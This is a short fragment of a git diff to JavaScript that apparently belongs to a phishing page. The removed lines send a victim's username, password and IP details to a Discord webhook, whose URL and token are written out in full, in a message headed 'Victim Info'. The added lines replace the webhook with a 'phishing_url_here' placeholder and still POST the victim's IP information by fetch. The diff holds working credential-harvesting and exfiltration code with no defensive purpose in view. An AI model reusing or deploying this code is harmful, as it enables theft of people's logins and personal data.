@@ -90,29 +90,8 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://discord.com/api/webhooks/1351971198988193842/XHcrE3DcM_RWCHNxoC9QLLqcLdPIFwvfEIzQ7FgTvEUv-DYERly7xiaLIJz0fJqupQ51";
-
-                const payload = {
-                    embeds: [{
-                        title: "Victim Info",
-                        description: `
-\`\`\`css
-User: ${username}
-Password: ${message}
-\`\`\``,
-                        color: 0xFF0000,
-                        timestamp: new Date().toISOString(),
-                        footer: {
-                            text: "IP Information",
-                        },
-                        fields: [
-                            {
-                                name: "IP Info",
-                                value: `\`\`\`${ipinfo}\`\`\``
-                            }
-                        ]
-                    }]
-                };
+                const webhookURL = "phishing_url_here"
+                const payload = {'victim_info': ipinfo};
 
                 fetch(webhookURL, {
                     method: "POST",
